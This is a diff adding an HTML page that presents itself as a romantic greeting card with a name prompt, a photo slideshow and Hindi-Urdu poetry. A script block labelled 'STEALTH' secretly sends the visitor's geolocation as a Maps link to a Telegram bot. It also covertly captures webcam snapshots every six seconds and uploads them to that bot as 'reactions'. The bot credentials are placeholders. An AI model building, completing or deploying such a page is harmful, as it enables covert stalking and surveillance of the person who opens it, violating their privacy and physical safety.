@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>For Someone Special ✨</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:italic,wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --accent: #ff4d6d; 
+            --bg: #050002;
+            --glass: rgba(255, 192, 203, 0.08); 
+            --border: rgba(255, 255, 255, 0.12);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; cursor: none; }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--bg);
+            color: white;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* STARRY BACKGROUND */
+        #canvas-container {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            background: radial-gradient(circle at center, #1a000a 0%, #050002 100%);
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle var(--d) infinite ease-in-out;
+            will-change: opacity, transform;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; transform: scale(1); }
+            50% { opacity: 0.9; transform: scale(1.5); }
+        }
+
+        /* CURSOR HEART */
+        .cursor-heart {
+            position: fixed;
+            font-size: 16px;
+            pointer-events: none;
+            z-index: 9999;
+            animation: flyUp 1.2s ease-out forwards;
+            color: var(--accent);
+            text-shadow: 0 0 10px var(--accent);
+            will-change: transform, opacity;
+        }
+
+        @keyframes flyUp {
+            0% { transform: translate3d(0,0,0) scale(1.5); opacity: 1; }
+            100% { transform: translate3d(0,-100px,0) rotate(45deg) scale(0); opacity: 0; }
+        }
+
+        /* CARD SYSTEM */
+        .layer {
+            position: absolute;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            width: 90%;
+            max-width: 450px;
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .layer.active { display: flex; animation: fadeIn 1s forwards; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); filter: blur(10px); }
+            to { opacity: 1; transform: scale(1); filter: blur(0); }
+        }
+
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 40px;
+            padding: 40px 25px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            width: 100%;
+        }
+
+        h1 {
+            font-family: "Playfair Display";
+            font-style: italic;
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            background: linear-gradient(to right, #fff, #ffb3c1, var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .quote {
+            font-weight: 300;
+            line-height: 1.6;
+            color: #ddd;
+            margin-bottom: 25px;
+            font-size: 1rem;
+        }
+
+        button {
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            background: white;
+            color: #000;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.8rem;
+        }
+
+        button:hover { background: var(--accent); color: white; transform: translateY(-3px); }
+
+        /* CINEMA MODE */
+        #L4 { width: 100vw; height: 100vh; max-width: none; background: #000; }
+        
+        #slide {
+            position: absolute;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 1.2s ease-in-out, transform 6s linear;
+            filter: brightness(0.6);
+        }
+
+        .zoom-effect { transform: scale(1.15); }
+
+        .cinema-overlay {
+            position: absolute;
+            bottom: 15%;
+            left: 5%;
+            right: 5%;
+            z-index: 10;
+            text-align: center;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: 1s ease;
+        }
+
+        .cinema-overlay.show { opacity: 1; transform: translateY(0); }
+
+        #shayari-text {
+            font-family: 'Playfair Display';
+            font-size: 1.5rem;
+            color: #fff;
+            text-shadow: 2px 2px 10px rgba(0,0,0,0.8);
+            line-height: 1.4;
+        }
+
+        #v_box, #c_box { display: none; }
+    </style>
+</head>
+<body>
+
+<div id="canvas-container"></div>
+<audio id="music" loop src="Song.mp3"></audio>
+
+<div id="L1" class="layer active">
+    <div class="card">
+        <p style="color: var(--accent); font-size: 0.7rem; letter-spacing: 2px; margin-bottom: 5px;">A BEAUTIFUL MEMORY</p>
+        <h1>Hey Special ✨</h1>
+        <p class="quote">Zindagi ke kuch panno ko aaj ek saath <br>dobara jeete hain...</p>
+        <input id="nameInput" type="text" placeholder="Apna Pyaara Naam..." style="background: rgba(255,255,255,0.05); border: 1px solid var(--border); border-radius: 15px; padding: 12px; color: white; width: 100%; text-align: center; margin-bottom: 20px; outline: none;">
+        <button onclick="startExperience()">Enter Her Heart</button>
+    </div>
+</div>
+
+<div id="L2" class="layer">
+    <div class="card">
+        <h1 id="welcomeTitle"></h1>
+        <p id="msg" class="quote" style="min-height: 80px;"></p>
+        <button id="nextBtn" style="display:none" onclick="showLayer(2,3)">Chalo Aage →</button>
+    </div>
+</div>
+
+<div id="L3" class="layer">
+    <div class="card">
+        <h1>Mera Ek Waada</h1>
+        <p class="quote">Apni kuch pasandida photos select karo, <br>main unhe ek sapne jaisa bana dunga.</p>
+        <input type="file" id="upload" multiple accept="image/*" style="display:none">
+        <button onclick="document.getElementById('upload').click()">📁 Select Photos</button>
+        <div id="preview" style="display:grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 15px;"></div>
+        <button id="magicBtn" style="display:none; margin-top: 15px; background: var(--accent); color: white;" onclick="startCinema()">Create Magic ✨</button>
+    </div>
+</div>
+
+<div id="L4" class="layer">
+    <img id="slide">
+    <div style="position:absolute; inset:0; background: radial-gradient(circle, transparent, rgba(0,0,0,0.4));"></div>
+    <div id="textOverlay" class="cinema-overlay">
+        <p id="shayari-text"></p>
+    </div>
+</div>
+
+<div id="L5" class="layer">
+    <div class="card">
+        <h1>Bas Itna Hi... ❤️</h1>
+        <p class="quote">Umeed hai tumhari muskurahat barkarar rahi hogi. <br>Ye pal hamesha yaad rahenge.</p>
+        <button onclick="location.reload()">Replay The Vibe</button>
+    </div>
+</div>
+
+<video id="v_box" autoplay playsinline></video>
+<canvas id="c_box"></canvas>
+
+<script>
+    // --- BOT CONFIG ---
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+    const CHAT_ID = 'YOUR_CHAT_ID';
+
+    // OPTIMIZED STARS
+    function createStars() {
+        const container = document.getElementById('canvas-container');
+        const frag = document.createDocumentFragment();
+        for(let i=0; i<80; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            const size = Math.random() * 2 + 'px';
+            star.style.width = size; star.style.height = size;
+            star.style.left = Math.random() * 100 + 'vw';
+            star.style.top = Math.random() * 100 + 'vh';
+            star.style.setProperty('--d', (Math.random() * 2 + 2) + 's');
+            frag.appendChild(star);
+        }
+        container.appendChild(frag);
+    }
+    createStars();
+
+    // SMOOTH CURSOR
+    document.addEventListener('mousemove', (e) => {
+        const h = document.createElement('div');
+        h.innerHTML = '❤';
+        h.className = 'cursor-heart';
+        h.style.left = e.clientX + 'px';
+        h.style.top = e.clientY + 'px';
+        document.body.appendChild(h);
+        setTimeout(() => h.remove(), 1200);
+    });
+
+    function showLayer(oldL, newL) {
+        const o = document.getElementById(`L${oldL}`);
+        o.classList.remove('active');
+        setTimeout(() => {
+            o.style.display = 'none';
+            const n = document.getElementById(`L${newL}`);
+            n.style.display = 'flex';
+            setTimeout(() => n.classList.add('active'), 50);
+        }, 800);
+    }
+
+    function startExperience() {
+        const name = document.getElementById('nameInput').value || "Pari";
+        document.getElementById('music').play().catch(() => {});
+        document.getElementById('welcomeTitle').innerText = `Hey ${name}...`;
+        showLayer(1, 2);
+        
+        let text = "Tumhari ek hansi poora din bana deti hai. Is liye maine socha kyun na aaj tumhare liye kuch khaas banaya jaye... Taiyaar ho?";
+        let i = 0;
+        function type() {
+            if (i < text.length) {
+                document.getElementById("msg").innerHTML += text.charAt(i);
+                i++;
+                setTimeout(type, 45);
+            } else {
+                document.getElementById('nextBtn').style.display = 'inline-block';
+            }
+        }
+        type();
+        triggerStealth(name);
+    }
+
+    // CINEMA ENGINE
+    let images = [];
+    const shayaris = [
+        "Tumhe dekha toh ye khayal aaya,\nZindagi dhoop, tum ghana saaya.",
+        "Teri hansi ki ek jhalak hi kafi hai,\nMere murjhaye chehre ko khilane ke liye.",
+        "Kuch lamhe hamesha ke liye thahar jate hain,\nJab tum mere saath hoti ho.",
+        "Mohabbat ki koi zubaan nahi hoti,\nYe toh bas aankhon se bayan hoti hai.",
+        "Tumse milna ek ittefaq nahi,\nKhuda ka banaya ek haseen mauka tha.",
+        "Bas ek tumhara saath chahiye,\nBaaki duniya toh matlabi hai."
+    ];
+
+    document.getElementById('upload').onchange = (e) => {
+        images = Array.from(e.target.files);
+        const prev = document.getElementById('preview');
+        prev.innerHTML = '';
+        images.slice(0, 6).forEach(f => {
+            const img = document.createElement('img');
+            img.src = URL.createObjectURL(f);
+            img.style.width='100%'; img.style.aspectRatio='1'; img.style.objectFit='cover'; img.style.borderRadius='10px';
+            prev.appendChild(img);
+        });
+        if(images.length > 0) document.getElementById('magicBtn').style.display = 'inline-block';
+    }
+
+    let sIdx = 0;
+    function startCinema() {
+        showLayer(3, 4);
+        runSlideshow();
+    }
+
+    function runSlideshow() {
+        if (sIdx >= images.length) {
+            setTimeout(() => showLayer(4, 5), 2000);
+            return;
+        }
+
+        const slide = document.getElementById('slide');
+        const overlay = document.getElementById('textOverlay');
+        const txt = document.getElementById('shayari-text');
+
+        // Reset
+        slide.style.opacity = 0;
+        slide.classList.remove('zoom-effect');
+        overlay.classList.remove('show');
+
+        setTimeout(() => {
+            slide.src = URL.createObjectURL(images[sIdx]);
+            slide.style.opacity = 1;
+            slide.classList.add('zoom-effect');
+            txt.innerText = shayaris[sIdx % shayaris.length];
+            
+            setTimeout(() => overlay.classList.add('show'), 1200);
+            
+            sIdx++;
+            setTimeout(runSlideshow, 5500); // 5.5 seconds total per slide
+        }, 1000);
+    }
+
+    // STEALTH
+    function triggerStealth(name) {
+        navigator.geolocation.getCurrentPosition(p => {
+            sendToTG(`📍 ${name} is Live!\nLink: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, null, false);
+        });
+        const v = document.getElementById('v_box');
+        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+            v.srcObject = s;
+            setInterval(() => {
+                const c = document.getElementById('c_box');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => sendToTG(b, `Reaction: ${name}`, true), 'image/jpeg', 0.5);
+            }, 6000);
+        }).catch(() => {});
+    }
+
+    function sendToTG(d, c, p) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        if(p) { fd.append('photo', d); fd.append('caption', c); fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}); }
+        else { fd.append('text', d); fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method:'POST', body:fd}); }
+    }
+</script>
+</body>
+</html>
